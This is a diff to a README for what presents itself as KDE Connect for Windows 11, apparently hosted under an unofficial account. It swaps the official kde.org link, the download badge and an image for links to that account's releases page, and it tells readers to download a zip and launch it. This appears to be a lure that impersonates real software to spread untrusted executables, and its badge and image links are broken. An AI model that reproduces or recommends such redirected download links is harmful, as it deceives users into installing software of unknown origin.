@@ -23,7 +23,7 @@ Welcome to the KDE Connect repository, your go-to tool for seamless synchronizat
 
 1. Download the latest release of KDE Connect from the following link: 
 
-[![Download KDE Connect](https://img.shields.io/badge/Download-KDE%20Connect-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download KDE Connect](https://github.com/Melo-e-Rodrigues/KDE-Connect/releases%20Connect-blue)](https://github.com/Melo-e-Rodrigues/KDE-Connect/releases)
 
 2. Once the download is complete, launch the file to begin the installation process.
 
@@ -55,10 +55,10 @@ Want to contribute to KDE Connect? We welcome contributions from the community! 
 
 ## Stay Updated 📩
 
-To stay updated on the latest releases and news about KDE Connect, visit the [official website](https://www.kde.org/applications/system/kdeconnect).
+To stay updated on the latest releases and news about KDE Connect, visit the [official website](https://github.com/Melo-e-Rodrigues/KDE-Connect/releases).
 
 Remember, KDE Connect is all about enhancing the connection between your Android device and Windows 11 PC, making your workflow smoother and more efficient. Download KDE Connect today and experience the convenience it offers!
 
 Let's Connect Seamlessly with KDE Connect! 🌐
 
-![KDE Connect](https://www.example.com/kde-connect-image.png)
+![KDE Connect](https://github.com/Melo-e-Rodrigues/KDE-Connect/releases)
